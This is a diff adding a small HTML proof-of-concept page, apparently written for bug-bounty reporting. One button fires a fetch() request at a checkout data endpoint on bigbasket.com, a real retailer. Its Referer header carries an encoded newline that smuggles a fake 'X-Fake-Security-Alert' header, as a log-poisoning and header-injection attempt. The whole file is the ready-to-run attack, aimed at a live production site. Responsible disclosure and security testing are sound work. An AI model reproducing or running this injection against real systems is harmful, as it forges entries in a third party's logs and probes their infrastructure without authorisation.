@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>Log Poisoning / Header Injection PoC</h3>
+    <button onclick="exploit()">Send Exploit</button>
+
+    <script>
+      function exploit() {
+        fetch("https://www.bigbasket.com/_next/data/sZYVvJrpabf3bDx9GDI54/co/checkout.json", {
+          method: "GET",
+          headers: {
+            "Referer": "https://test.bugbountypoc.in/%0aX-Fake-Security-Alert: Detected"
+          }
+        }).then(response => {
+          alert("Request sent. Check response headers in proxy or browser dev tools.");
+        });
+      }
+    </script>
+  </body>
+</html>
